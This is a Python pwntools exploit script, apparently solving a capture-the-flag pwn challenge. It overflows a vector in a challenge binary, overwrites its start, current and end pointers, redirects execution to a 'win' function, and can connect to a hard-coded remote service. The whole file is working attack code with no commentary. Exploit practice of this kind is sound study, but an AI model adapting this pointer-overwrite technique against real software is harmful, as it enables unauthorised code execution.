from pwn import *
from icecream import ic

elf = exe = ELF("./a.out")

context.binary = exe
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.170.146.252", 55287)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401425
b *main
b *0x000000000040136e
# b *0x00000000004012c9
b *win
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

win = 0x401427

sl(str((0x30d60) + 1 + 4))

sl(b'1 100')
sl(b'1 100')
sl(b'1 100')
for i in range((0x30d60 - 3)//2):
    sl(str(0))
    sl(str(win))

sl(str(0x405030))       # vector start
sl(str(0))
sl(str(0x405038))       # vector curr pointer
sl(str(0))
sl(str(0x405058))       # vector end
sl(str(0))

io.interactive()
